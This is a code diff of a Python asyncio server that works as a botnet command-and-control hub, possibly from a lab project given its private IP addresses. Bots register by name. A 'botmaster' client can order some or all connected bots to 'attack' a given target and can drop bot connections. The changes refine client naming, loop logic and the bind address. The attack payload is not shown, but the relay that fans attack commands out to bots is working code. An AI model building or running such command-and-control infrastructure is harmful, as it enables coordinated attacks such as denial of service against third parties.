@@ -10,7 +10,7 @@ async def handle_client(reader, writer):
     while True:
         data = await reader.read(4096)
         if not data:
-            print(f'data is None, disconnect the client {client_name}')
+            print(f'Disconnect the client {client_name}')
             if client_name in clients:
                 del clients[client_name]
             break
@@ -25,20 +25,21 @@ async def handle_client(reader, writer):
         if cmd == 'register':
             who = para[1]
             if client_name is None:
-                client_name = who
+                client_name = who + '@' + client_host + ':' + str(client_port)
                 clients[client_name] = writer
-                print(f"Client registered: {who}")
+                print(f"Client registered: {client_name}")
             else:
-                print(f"Client already been registered: {who}")
+                print(f"Client already been registered: {client_name}")
         else:
             print(f"message received from: {client_name}:{message}")
-            if client_name == 'botmaster':
+            if client_name.startswith('botmaster'):
                 # clean closed clients
                 to_clean = []
                 for c, w in clients.items():
                     if w.is_closing():
                         to_clean.append(c)
                 for k in to_clean:
+                    print(f"Bot cleaned: {k}")
                     del clients[k]
 
                 botmaster_writer = clients[client_name]
@@ -65,22 +66,26 @@ async def handle_client(reader, writer):
                         if bot_cnt == -2:
                             bot_writer = clients[bot]
                             bot_writer.close()
+                            #  await bot_writer.wait_closed()
                             del clients[bot]
-                            res = f'{bot} disconnected'
+                            res = f'{bot} connection reset'
                         else:
                             to_delete = []
                             i = 0
                             for b, w in clients.items():
-                                if b != 'botmaster':
-                                    w.close()
-                                    to_delete.append(b)
-                                    i += 1
-                                    if bot_cnt >= 0 and i >= bot_cnt:
-                                        break
+                                if b.startswith('botmaster'):
+                                    continue
+                                if bot_cnt >= 0 and i >= bot_cnt:
+                                    break
+                                w.close()
+                                #  await w.wait_closed()
+                                to_delete.append(b)
+                                i += 1
 
                             for k in to_delete:
+                                print(f"Bot deleted: {k}")
                                 del clients[k]
-                            res = f'{i} bots disconnected'
+                            res = f'{i} bots connection reset'
                     elif cmd == 'attack':
                         bot_cmd = 'attack ' + para[2]
                         if bot_cnt == -2:
@@ -91,12 +96,13 @@ async def handle_client(reader, writer):
                         else:
                             i = 0
                             for b, w in clients.items():
-                                if b != 'botmaster':
-                                    w.write(bot_cmd.encode())
-                                    await w.drain()
-                                    i += 1
-                                    if bot_cnt >= 0 and i >= bot_cnt:
-                                        break
+                                if b.startswith('botmaster'):
+                                    continue
+                                if bot_cnt >= 0 and i >= bot_cnt:
+                                    break
+                                w.write(bot_cmd.encode())
+                                await w.drain()
+                                i += 1
                             res = f'cmd:{bot_cmd} sent to {i} bots'
                 botmaster_writer.write(res.encode())
                 await botmaster_writer.drain()
@@ -104,7 +110,7 @@ async def handle_client(reader, writer):
 
 async def main():
     server = await asyncio.start_server(
-        handle_client, '10.11.45.53', 9999)
+        handle_client, '192.168.100.4', 9999)
 
     addr = server.sockets[0].getsockname()
     print(f'Serving on {addr}')
